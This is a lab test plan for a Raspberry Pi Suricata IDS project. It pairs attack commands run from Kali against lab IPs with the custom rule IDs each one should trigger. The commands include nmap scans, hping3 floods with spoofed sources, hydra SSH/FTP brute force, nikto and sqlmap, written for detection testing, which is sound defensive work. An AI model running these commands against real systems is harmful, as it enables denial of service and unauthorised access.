# Attack Test Plan

Final lab: attacker = Kali `192.168.10.20`, target = the Raspberry Pi itself `192.168.10.50` (lab subnet 192.168.10.0/24).
The commands below were first written for a Metasploitable victim (192.168.1.60); in the final tests replace that IP with `192.168.10.50`.
Final build loads only the 18 custom rules (ET Open disabled).
Each test runs **5 times**. For every run save the matching `fast.log` lines into
`tests/evidence/T<n>-run<k>.txt` and a screenshot into `docs/images/week3-testing/`.

Before each run on the Pi: `sudo tail -f /var/log/suricata/fast.log`

| ID | Attack | Kali command | Expected rule(s) |
| --- | --- | --- | --- |
| T1 | TCP SYN port scan | `sudo nmap -sS -p 1-1000 192.168.1.60` | 1000001 |
| T2 | Stealth scans | `sudo nmap -sX 192.168.1.60` / `-sN` / `-sF` | 1000002, 1000003, 1000004 |
| T3 | Aggressive scan + OS detection | `sudo nmap -A 192.168.1.60` | 1000001, 1000006, 9000002–9000004 |
| T4 | ICMP flood (10 s) | `sudo timeout 10 hping3 -1 --flood 192.168.1.60` | 1000005 |
| T5 | SSH brute force | `hydra -l msfadmin -P /usr/share/wordlists/fasttrack.txt ssh://192.168.1.60 -t 4` | 1000006 |
| T6 | FTP brute force | `hydra -l msfadmin -P /usr/share/wordlists/fasttrack.txt ftp://192.168.1.60` | 1000007 |
| T7 | SYN flood (10 s) | `sudo timeout 10 hping3 -S --flood -p 80 192.168.1.60` | 1000008 |
| T8 | Web attacks | `nikto -h http://192.168.1.60` and `sqlmap -u "http://192.168.1.60/mutillidae/index.php?page=user-info.php&username=a&password=a" --batch` | 1000010, 1000011, 1000013 |
| T9 | EICAR malware download | Kali: `python3 -m http.server 8000` (folder with eicar.com); victim: `wget http://KALI_IP:8000/eicar.com` | 1000009 |
| U1 | UDP port scan | `sudo nmap -sU --top-ports 20 192.168.10.50` | 9000005 |
| P1 | Telnet policy violation | real connection to port 23 (`echo hello \| nc -w 3 192.168.10.50 23`) | 1000012 |
| D1 | Distributed ICMP flood | `sudo timeout 10 hping3 -1 --flood --rand-source 192.168.10.50` | 1000005, 9000001 |
| D2 | Distributed SYN flood | `sudo timeout 10 hping3 -S -p 80 --flood --rand-source 192.168.10.50` | 1000008 |
| B0 | Benign baseline, 1 hour | normal browsing, YouTube, downloads | none (every alert = false positive) |

Record results in [`results/attack-results.csv`](../results/attack-results.csv).

## Saving evidence quickly (on the Pi)

```bash
# after run k of test n:
grep "$(date +%m/%d/%Y-%H:%M)" /var/log/suricata/fast.log > ~/netguard-pi/tests/evidence/T1-run1.txt
```
